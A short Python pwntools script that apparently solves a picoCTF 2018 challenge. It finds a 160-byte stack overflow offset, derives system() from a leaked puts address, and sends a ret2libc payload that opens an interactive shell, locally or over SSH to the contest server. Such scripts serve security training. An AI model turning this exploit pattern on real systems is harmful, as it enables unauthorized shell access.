#!/usr/bin/env python

from pwn import *
import sys

#context.log_level = 'critical'

#load our addresses and offsets
e = ELF('./vuln')
libc = ELF('/lib32/libc.so.6')
system_off = libc.symbols['system']
puts_off = libc.symbols['puts']

offset = system_off - puts_off

#find buffer amount
'''
pwn cyclic 172 | strace ./vuln
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x62616170} ---
+++ killed by SIGSEGV +++
Segmentation fault
pwn cyclic -l 0x62616170
160
'''
buf = 160

argc = len(sys.argv)

if argc > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('vuln', cwd='/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f')
else:
	p = process('./vuln')

p.recvuntil('puts: ')
puts = int(p.recv(10), 16)
p.recvuntil('useful_string: ')
shell = int(p.recv(10), 16)

#calculate libc base
system = offset + puts

log.info(hex(shell))
log.info(hex(system))

sleep(1)
#build second payload
payload = ''
payload+= 'A'*buf
payload+= p32(system)
payload+= 'AAAA'
payload+= p32(shell)

#send payload and set interactive mode
p.sendline(payload)
p.interactive()